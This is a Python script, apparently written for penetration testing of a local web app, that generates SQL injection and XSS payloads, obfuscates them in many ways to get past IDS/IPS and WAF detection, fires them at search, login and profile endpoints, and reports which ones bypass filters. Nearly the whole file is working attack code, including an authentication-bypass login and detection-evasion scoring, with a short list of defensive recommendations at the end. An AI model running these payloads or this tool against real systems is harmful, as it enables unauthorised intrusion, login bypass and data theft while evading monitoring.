#!/usr/bin/env python3
"""
Advanced Evasion Tester - Python Script
Automated testing for IDS/IPS bypass techniques
"""

import requests
import base64
import urllib.parse
import json
import time
import random
import string
from typing import Dict, List, Tuple, Any

class AdvancedEvasionTester:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.results = []
        
    def generate_random_string(self, length: int = 8) -> str:
        """Generate random string for junk data"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def multi_layer_encode(self, payload: str) -> str:
        """Apply multiple encoding layers"""
        # Layer 1: Base64
        encoded = base64.b64encode(payload.encode()).decode()
        # Layer 2: URL encode
        encoded = urllib.parse.quote(encoded)
        # Layer 3: Double URL encode
        encoded = urllib.parse.quote(encoded)
        return encoded
    
    def char_code_obfuscation(self, keyword: str) -> str:
        """Convert keyword to character codes"""
        char_codes = [str(ord(c)) for c in keyword]
        return f"CHR({'),CHR('.join(char_codes)})"
    
    def hex_encode_payload(self, payload: str) -> str:
        """Hex encode payload"""
        return '0x' + payload.encode().hex()
    
    def fragment_payload(self, payload: str, chunk_size: int = 3) -> List[str]:
        """Fragment payload into smaller chunks"""
        return [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    
    def generate_sql_evasion_payloads(self) -> Dict[str, Dict[str, str]]:
        """Generate SQL injection payloads with various evasion techniques"""
        base_payloads = {
            'union_basic': "' UNION SELECT null,null,null,null,null,null--",
            'boolean_blind': "' AND 1=1--",
            'time_based': "' AND (SELECT SLEEP(5))--",
            'error_based': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
            'info_schema': "' UNION SELECT table_name,null,null,null,null,null FROM information_schema.tables--"
        }
        
        evaded_payloads = {}
        
        for name, payload in base_payloads.items():
            evaded_payloads[name] = {
                'original': payload,
                'char_codes': self.char_code_obfuscation(payload.replace("'", "").replace("--", "")),
                'hex_encoded': self.hex_encode_payload(payload),
                'multi_encoded': self.multi_layer_encode(payload),
                'comment_injected': payload.replace(' ', '/**/'),
                'case_varied': ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload),
                'fragmented': '+'.join(self.fragment_payload(payload, 4)),
                'whitespace_varied': payload.replace(' ', random.choice(['\t', '\n', '\f', '\v'])),
                'alternative_operators': payload.replace('AND', '&&').replace('OR', '||').replace('=', ' LIKE '),
                'nested_comments': payload.replace('UNION', 'UN/**/ION').replace('SELECT', 'SEL/**/ECT')
            }
        
        return evaded_payloads
    
    def generate_xss_evasion_payloads(self) -> Dict[str, Dict[str, str]]:
        """Generate XSS payloads with evasion techniques"""
        base_payloads = {
            'basic_script': "<script>alert('XSS')</script>",
            'event_handler': '<img src=x onerror="alert(1)">',
            'javascript_uri': 'javascript:alert(1)',
            'svg_injection': '<svg onload="alert(1)"></svg>',
            'iframe_src': '<iframe src="javascript:alert(1)"></iframe>'
        }
        
        evaded_payloads = {}
        
        for name, payload in base_payloads.items():
            evaded_payloads[name] = {
                'original': payload,
                'char_codes': '<script>alert(String.fromCharCode(88,83,83))</script>',
                'hex_escape': payload.replace('alert', '\\x61\\x6c\\x65\\x72\\x74'),
                'unicode': payload.replace('<', '\\u003c').replace('>', '\\u003e'),
                'base64_eval': f'<script>eval(atob("{base64.b64encode(payload.encode()).decode()}"))</script>',
                'html_entities': payload.replace('<', '&lt;').replace('>', '&gt;'),
                'double_encoded': urllib.parse.quote(urllib.parse.quote(payload)),
                'case_variation': ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload),
                'event_fragmented': payload.replace('onerror', 'on' + 'error'),
                'null_bytes': payload.replace('script', 'scr\x00ipt'),
                'nested_tags': '<scr<script>ipt>alert(1)</script>'
            }
        
        return evaded_payloads
    
    def test_search_endpoint(self, payload: str) -> Dict[str, Any]:
        """Test search endpoint with payload"""
        try:
            url = f"{self.base_url}/search.php"
            params = {'q': payload}
            
            response = self.session.get(url, params=params, timeout=10)
            
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'contains_payload': payload in response.text,
                'executed': 'alert' in response.text.lower() if 'script' in payload.lower() else False,
                'sql_error': any(error in response.text.lower() for error in ['sql', 'mysql', 'error', 'syntax']),
                'response_headers': dict(response.headers)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_login_endpoint(self, username_payload: str) -> Dict[str, Any]:
        """Test login endpoint with payload"""
        try:
            url = f"{self.base_url}/login.php"
            data = {
                'username': username_payload,
                'password': 'dummy_password'
            }
            
            response = self.session.post(url, data=data, timeout=10)
            
            # Check if login was bypassed
            bypassed = any(indicator in response.text.lower() for indicator in [
                'welcome', 'dashboard', 'profile', 'logout', 'berhasil login'
            ])
            
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'login_bypassed': bypassed,
                'sql_error': any(error in response.text.lower() for error in ['sql', 'mysql', 'error']),
                'redirect_location': response.headers.get('Location', ''),
                'session_created': 'Set-Cookie' in response.headers
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_profile_endpoint(self, payload: str) -> Dict[str, Any]:
        """Test profile endpoint with payload"""
        try:
            # First, try to login with a basic bypass
            login_url = f"{self.base_url}/login.php"
            login_data = {'username': "admin' OR '1'='1'--", 'password': 'any'}
            self.session.post(login_url, data=login_data)
            
            # Then test profile update
            url = f"{self.base_url}/profile.php"
            data = {
                'action': 'update_profile',
                'full_name': payload,
                'email': 'test@example.com',
                'bio': 'test bio'
            }
            
            response = self.session.post(url, data=data, timeout=10)
            
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'contains_payload': payload in response.text,
                'sql_error': any(error in response.text.lower() for error in ['sql', 'mysql', 'error']),
                'update_success': 'berhasil' in response.text.lower(),
                'xss_reflected': payload in response.text and '<script>' in payload
            }
        except Exception as e:
            return {'error': str(e)}
    
    def analyze_detection_evasion(self, payload: str) -> Dict[str, bool]:
        """Analyze how well payload evades common detection patterns"""
        patterns = {
            'single_quote': "'" not in payload,
            'or_1_equals_1': "' OR 1=1" not in payload.upper(),
            'union_select': "UNION SELECT" not in payload.upper(),
            'script_tag': "<SCRIPT>" not in payload.upper(),
            'alert_function': "ALERT(" not in payload.upper(),
            'onload_event': "ONLOAD=" not in payload.upper(),
            'extractvalue': "EXTRACTVALUE" not in payload.upper(),
            'sleep_function': "SLEEP(" not in payload.upper(),
            'and_1_equals_1': "AND 1=1" not in payload.upper(),
            'double_dash': "--" not in payload,
            'information_schema': "INFORMATION_SCHEMA" not in payload.upper(),
            'version_function': "VERSION(" not in payload.upper(),
            'drop_table': "DROP TABLE" not in payload.upper(),
            'load_file': "LOAD_FILE" not in payload.upper(),
            'if_condition': "IF(" not in payload.upper(),
            'concat_function': "CONCAT(" not in payload.upper(),
            'mathematical_ops': not any(op in payload for op in ['+', '-', '*', '/']),
            'sqlmap_agent': "SQLMAP" not in payload.upper()
        }
        
        evasion_score = sum(patterns.values()) / len(patterns) * 100
        
        return {
            'patterns_evaded': patterns,
            'evasion_percentage': round(evasion_score, 2),
            'likely_undetected': evasion_score > 70
        }
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive evasion testing"""
        print("🚀 Starting Advanced IDS/IPS Evasion Testing...")
        
        # Generate all evasion payloads
        sql_payloads = self.generate_sql_evasion_payloads()
        xss_payloads = self.generate_xss_evasion_payloads()
        
        results = {
            'sql_injection_tests': {},
            'xss_tests': {},
            'summary': {
                'total_tests': 0,
                'successful_bypasses': 0,
                'high_evasion_count': 0,
                'average_evasion_score': 0
            }
        }
        
        total_evasion_scores = []
        
        # Test SQL injection payloads
        print("\n🎯 Testing SQL Injection Evasion...")
        for payload_name, variants in sql_payloads.items():
            results['sql_injection_tests'][payload_name] = {}
            
            for variant_name, payload in variants.items():
                print(f"  Testing {payload_name} - {variant_name}...")
                
                # Test on different endpoints
                search_result = self.test_search_endpoint(payload)
                login_result = self.test_login_endpoint(payload)
                profile_result = self.test_profile_endpoint(payload)
                
                # Analyze evasion effectiveness
                evasion_analysis = self.analyze_detection_evasion(payload)
                total_evasion_scores.append(evasion_analysis['evasion_percentage'])
                
                if evasion_analysis['evasion_percentage'] > 80:
                    results['summary']['high_evasion_count'] += 1
                
                results['sql_injection_tests'][payload_name][variant_name] = {
                    'payload': payload,
                    'search_test': search_result,
                    'login_test': login_result,
                    'profile_test': profile_result,
                    'evasion_analysis': evasion_analysis
                }
                
                results['summary']['total_tests'] += 1
                
                # Check for successful bypass
                if (search_result.get('sql_error') or 
                    login_result.get('login_bypassed') or 
                    profile_result.get('update_success')):
                    results['summary']['successful_bypasses'] += 1
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.5)
        
        # Test XSS payloads
        print("\n🎯 Testing XSS Evasion...")
        for payload_name, variants in xss_payloads.items():
            results['xss_tests'][payload_name] = {}
            
            for variant_name, payload in variants.items():
                print(f"  Testing {payload_name} - {variant_name}...")
                
                # Test XSS payloads
                search_result = self.test_search_endpoint(payload)
                profile_result = self.test_profile_endpoint(payload)
                
                evasion_analysis = self.analyze_detection_evasion(payload)
                total_evasion_scores.append(evasion_analysis['evasion_percentage'])
                
                if evasion_analysis['evasion_percentage'] > 80:
                    results['summary']['high_evasion_count'] += 1
                
                results['xss_tests'][payload_name][variant_name] = {
                    'payload': payload,
                    'search_test': search_result,
                    'profile_test': profile_result,
                    'evasion_analysis': evasion_analysis
                }
                
                results['summary']['total_tests'] += 1
                
                if (search_result.get('contains_payload') or 
                    profile_result.get('xss_reflected')):
                    results['summary']['successful_bypasses'] += 1
                
                time.sleep(0.5)
        
        # Calculate summary statistics
        if total_evasion_scores:
            results['summary']['average_evasion_score'] = round(
                sum(total_evasion_scores) / len(total_evasion_scores), 2
            )
        
        return results
    
    def generate_report(self, results: Dict[str, Any]) -> str:
        """Generate detailed test report"""
        report = "# 🥷 ADVANCED IDS/IPS EVASION TEST REPORT\n\n"
        report += f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Target: {self.base_url}\n\n"
        
        # Summary
        summary = results['summary']
        report += "## 📊 EXECUTIVE SUMMARY\n\n"
        report += f"- **Total Tests:** {summary['total_tests']}\n"
        report += f"- **Successful Bypasses:** {summary['successful_bypasses']}\n"
        report += f"- **High Evasion Payloads:** {summary['high_evasion_count']}\n"
        report += f"- **Average Evasion Score:** {summary['average_evasion_score']}%\n"
        report += f"- **Bypass Success Rate:** {round((summary['successful_bypasses'] / summary['total_tests']) * 100, 2)}%\n\n"
        
        # Risk Assessment
        if summary['average_evasion_score'] > 80:
            risk_level = "🚨 CRITICAL"
            risk_color = "RED"
        elif summary['average_evasion_score'] > 60:
            risk_level = "⚠️ HIGH"
            risk_color = "ORANGE"
        elif summary['average_evasion_score'] > 40:
            risk_level = "🟡 MEDIUM"
            risk_color = "YELLOW"
        else:
            risk_level = "✅ LOW"
            risk_color = "GREEN"
        
        report += f"## 🎯 RISK ASSESSMENT: {risk_level}\n\n"
        
        # Detailed results for highest scoring payloads
        report += "## 🔥 TOP EVASION PAYLOADS\n\n"
        
        all_tests = []
        for category in ['sql_injection_tests', 'xss_tests']:
            for payload_name, variants in results[category].items():
                for variant_name, test_data in variants.items():
                    evasion_score = test_data['evasion_analysis']['evasion_percentage']
                    all_tests.append({
                        'category': category,
                        'name': f"{payload_name} - {variant_name}",
                        'payload': test_data['payload'],
                        'evasion_score': evasion_score,
                        'test_data': test_data
                    })
        
        # Sort by evasion score
        top_tests = sorted(all_tests, key=lambda x: x['evasion_score'], reverse=True)[:10]
        
        for i, test in enumerate(top_tests, 1):
            report += f"### {i}. {test['name']} (Evasion: {test['evasion_score']}%)\n\n"
            report += f"**Payload:** `{test['payload'][:100]}{'...' if len(test['payload']) > 100 else ''}`\n\n"
            
            # Test results
            if 'search_test' in test['test_data']:
                search = test['test_data']['search_test']
                if not search.get('error'):
                    report += f"- **Search Test:** Status {search.get('status_code', 'N/A')}, "
                    report += f"SQL Error: {search.get('sql_error', False)}, "
                    report += f"Payload Reflected: {search.get('contains_payload', False)}\n"
            
            if 'login_test' in test['test_data']:
                login = test['test_data']['login_test']
                if not login.get('error'):
                    report += f"- **Login Test:** Bypass: {login.get('login_bypassed', False)}, "
                    report += f"SQL Error: {login.get('sql_error', False)}\n"
            
            report += "\n"
        
        # Recommendations
        report += "## 🛡️ SECURITY RECOMMENDATIONS\n\n"
        
        if summary['average_evasion_score'] > 60:
            report += "### IMMEDIATE ACTIONS REQUIRED:\n"
            report += "1. **Implement Deep Packet Inspection** - Analyze decoded content\n"
            report += "2. **Deploy Advanced WAF Rules** - Multi-layer detection\n"
            report += "3. **Enable Input Normalization** - Decode all encoding layers\n"
            report += "4. **Implement RASP** - Runtime Application Self-Protection\n"
            report += "5. **Update IDS/IPS Rules** - Add evasion-aware signatures\n\n"
        
        report += "### LONG-TERM IMPROVEMENTS:\n"
        report += "1. **Machine Learning Detection** - Behavioral analysis\n"
        report += "2. **Context-Aware Filtering** - Application-specific rules\n"
        report += "3. **Threat Intelligence Integration** - Dynamic rule updates\n"
        report += "4. **Security Code Review** - Fix vulnerable code patterns\n"
        report += "5. **Regular Penetration Testing** - Continuous validation\n\n"
        
        return report

def main():
    # Configuration
    BASE_URL = "http://localhost/Musywar"  # Change this to your target URL
    
    print("🥷 Advanced IDS/IPS Evasion Tester")
    print("=" * 50)
    print(f"Target URL: {BASE_URL}")
    print()
    
    # Initialize tester
    tester = AdvancedEvasionTester(BASE_URL)
    
    # Run comprehensive tests
    try:
        results = tester.run_comprehensive_test()
        
        # Generate and save report
        report = tester.generate_report(results)
        
        # Save to file
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        report_file = f"evasion_test_report_{timestamp}.md"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        # Save detailed JSON results
        json_file = f"evasion_test_results_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n✅ Testing completed!")
        print(f"📄 Report saved to: {report_file}")
        print(f"📊 Detailed results: {json_file}")
        
        # Print summary
        summary = results['summary']
        print(f"\n📈 SUMMARY:")
        print(f"   Total Tests: {summary['total_tests']}")
        print(f"   Successful Bypasses: {summary['successful_bypasses']}")
        print(f"   Average Evasion Score: {summary['average_evasion_score']}%")
        
        if summary['average_evasion_score'] > 70:
            print(f"   🚨 CRITICAL: High evasion success rate detected!")
        
    except Exception as e:
        print(f"❌ Error during testing: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())
